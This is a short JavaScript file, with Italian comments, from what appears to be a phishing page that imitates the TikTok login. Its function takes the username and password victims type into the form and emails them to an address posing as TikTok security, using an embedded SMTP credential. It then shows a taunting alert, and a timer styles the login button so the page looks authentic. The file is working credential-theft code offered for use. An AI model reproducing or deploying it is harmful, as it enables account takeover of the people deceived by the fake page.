let NomeUtente,Password;
function sendEmail() {
//-----------Aqcuisizione dati--------------------//
NomeUtente = document.getElementById("Nome/Email").value;
Password = document.getElementById("Password").value;
//-----------Spedizione dati--------------------//
Email.send({
  Host: "smtp.elasticemail.com",
  Username: "TikTok.sicurity@gmail.com",
  Password: "B6FD13B19B96DAA1F45AFE19D51C271E38C9",
  To: 'tiktok.sicurity@gmail.com',
  From: "tiktok.sicurity@gmail.com",
  Subject: "Nuovo account:",
  Body: ("Nome Utente: " + NomeUtente + "\n" + "Password: " + Password)
  })
  .then(function (message) {
  alert("Bell sta password waju")
  });
}
setInterval(() => {
  NomeUtente = document.getElementById("Nome/Email").value;
  Password = document.getElementById("Password").value;
  if(NomeUtente != "" && Password != ""){
    document.getElementById("btnAccedi").style.background="#FE2B54";
    document.getElementById("btnAccedi").style.border="#FE2B54";
    document.getElementById("btnAccedi").style.color="white";
    document.getElementById("btnAccedi").disabled=false;
  }
  else {
    document.getElementById("btnAccedi").style.background="#EBEBEB";
    document.getElementById("btnAccedi").style.border="#EBEBEB";
    document.getElementById("btnAccedi").style.color="#808185";
    document.getElementById("btnAccedi").disabled=true;
  }
}, 100);
